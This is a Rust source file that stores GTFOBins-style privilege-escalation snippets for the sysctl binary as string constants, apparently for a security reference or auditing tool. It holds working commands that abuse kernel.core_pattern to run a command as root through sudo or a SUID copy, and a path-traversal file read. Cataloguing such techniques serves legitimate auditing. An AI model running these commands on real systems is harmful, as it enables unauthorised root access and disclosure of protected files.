pub static BIN_NAME: &'static str = "sysctl";
pub static CMD_DESC: &'static str =
    "The command is executed by root in the background when a core dump occurs.";
pub static CMD_CODE: &'static str = r#"
    
    COMMAND='/bin/sh -c id>/tmp/id'
    sysctl "kernel.core_pattern=|$COMMAND"
    sleep 9999 &
    kill -QUIT $!
    cat /tmp/id
"#;
pub static FR_DESC: &'static str = "The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    /usr/sbin/sysctl -n "/../../$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which sysctl) .

    COMMAND='/bin/sh -c id>/tmp/id'
    ./sysctl "kernel.core_pattern=|$COMMAND"
    sleep 9999 &
    kill -QUIT $!
    cat /tmp/id
"#;
pub static SUDO_CODE: &'static str = r#"
    
    COMMAND='/bin/sh -c id>/tmp/id'
    sudo sysctl "kernel.core_pattern=|$COMMAND"
    sleep 9999 &
    kill -QUIT $!
    cat /tmp/id
"#;
use crate::code::{Code, Tag};
pub static CMD: Code<'static> = Code { 
	title: "CMD_CODE",
	code: CMD_CODE,
	tag: Tag::CMD,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
